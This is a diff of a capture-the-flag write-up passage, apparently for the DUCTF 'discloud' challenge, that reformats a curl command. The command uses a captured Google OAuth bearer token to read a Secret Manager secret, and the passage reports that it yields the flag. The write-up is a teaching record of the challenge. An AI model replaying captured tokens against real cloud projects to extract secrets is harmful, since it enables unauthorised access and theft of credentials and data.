@@ -275,7 +275,7 @@ Nice, there is a `big_secret` here! :+1:
 
 But what does it contain? According to the [documentation](https://cloud.google.com/secret-manager/docs/reference/rest/v1beta1/projects.secrets.versions/access) we need to add `:access` to access the data we want:
 
-curl -H 'authorization: Bearer ya29.c.Ko4C3Qf-S8rcLf1PkZildJPzRHxI60kqRM414NUfZYolVvSugFRMevK2nMs_2I_X9ScCf7JssEeNrQWrjlXZxwv6L0AR8tLGXpgzCaSE_XUpIuhie1zgcWukTbL24eHzQfUFPg_oPazKbSOitKYd4WC9izaniIG_z0IrF0FxEex4tbP_awrsJut6KSDg14oiqkUS2G0Nq7U8gN32NCmSp2zmSCgA5wODE92SrXSTYS-XZqIrzOS8vUqwz0oqSd0b-wlpKfMdd6N7quUgCltNfKi3tAOIrvvA6OK5-iBdKarQnZ1skm6wfqZujMo9yt5moELuT87ZYPxMhb2ZNIg8iQmxbwnV4gNwVPnGNzA5_S8z' https://secretmanager.googleapis.com/v1beta1/projects/discloud-chal/secrets/big_secret/versions/latest:access
+`curl -H 'authorization: Bearer ya29.c.Ko4C3Qf-S8rcLf1PkZildJPzRHxI60kqRM414NUfZYolVvSugFRMevK2nMs_2I_X9ScCf7JssEeNrQWrjlXZxwv6L0AR8tLGXpgzCaSE_XUpIuhie1zgcWukTbL24eHzQfUFPg_oPazKbSOitKYd4WC9izaniIG_z0IrF0FxEex4tbP_awrsJut6KSDg14oiqkUS2G0Nq7U8gN32NCmSp2zmSCgA5wODE92SrXSTYS-XZqIrzOS8vUqwz0oqSd0b-wlpKfMdd6N7quUgCltNfKi3tAOIrvvA6OK5-iBdKarQnZ1skm6wfqZujMo9yt5moELuT87ZYPxMhb2ZNIg8iQmxbwnV4gNwVPnGNzA5_S8z' https://secretmanager.googleapis.com/v1beta1/projects/discloud-chal/secrets/big_secret/versions/latest:access`
 
 Running the command above yields the flag: `DUCTF{bot_boi_2_cloud_secrets}`
 
